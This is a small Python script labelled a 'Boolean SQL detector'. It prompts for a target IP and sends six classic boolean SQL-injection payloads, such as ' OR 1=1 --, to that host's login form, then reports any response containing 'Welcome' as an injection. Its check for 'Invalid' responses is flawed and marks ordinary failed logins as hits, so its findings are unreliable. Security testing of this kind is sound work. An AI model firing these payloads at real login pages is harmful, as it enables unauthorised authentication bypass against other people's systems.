# -*- coding: utf-8 -*-
"""
Created on Fri Feb  21 03:345:47 2025

@author: IAN CAERTER KULANI

"""

from colorama import Fore
import pyfiglet
import os
font=pyfiglet.figlet_format("BOOLEAN SQL DETECTOR")
print(Fore.GREEN+font)

import requests
import time

# Function to detect Boolean-Based SQL Injection by analyzing the response
def detect_boolean_sql_injection(ip_address):
    print(f"Checking for potential Boolean-Based SQL Injection on {ip_address}...")

    # SQL injection payloads for Boolean-based SQL Injection
    payloads = [
        "' OR 1=1 --",   # Always true condition
        "' OR 1=2 --",   # Always false condition
        "' AND 1=1 --",  # Always true condition with AND
        "' AND 1=2 --",  # Always false condition with AND
        "' OR 'a'='a' --",# Always true condition (alternative format)
        "' OR 'a'='b' --",# Always false condition (alternative format)
    ]

    # Target URL for testing (e.g., a login page or search endpoint)
    url = f"http://{ip_address}/login"  # Adjust the URL accordingly

    for payload in payloads:
        try:
            # Simulate POST request with the payload in 'username' field (you can adjust the parameter names)
            data = {'username': payload, 'password': 'password'}  # Simple login form injection simulation
            
            # Send the POST request
            response = requests.post(url, data=data)
            
            if response.status_code == 200:
                # Check for changes in the response that indicate a successful injection
                if payload == "' OR 1=1 --" and "Welcome" in response.text:
                    print(f"[!] Boolean-Based SQL Injection detected with payload: {payload}")
                    print(f"Response contains 'Welcome' message (indicating login success).")
                elif payload == "' OR 1=2 --" and "Invalid" in response.text:
                    print(f"[!] Boolean-Based SQL Injection detected with payload: {payload}")
                    print(f"Response contains 'Invalid' message (indicating login failure).")
                else:
                    print(f"[+] No Boolean-based SQL Injection detected with payload: {payload}")
            else:
                print(f"[+] Request failed with status code: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Error making request: {e}")

# Main function to prompt the user and start the detection process
def main():
       # Prompt the user for an IP address to test for Boolean SQL Injection
    ip_address = input("Enter the target IP address:")

    # Start detecting Boolean-Based SQL Injection
    detect_boolean_sql_injection(ip_address)

if __name__ == "__main__":
    main()
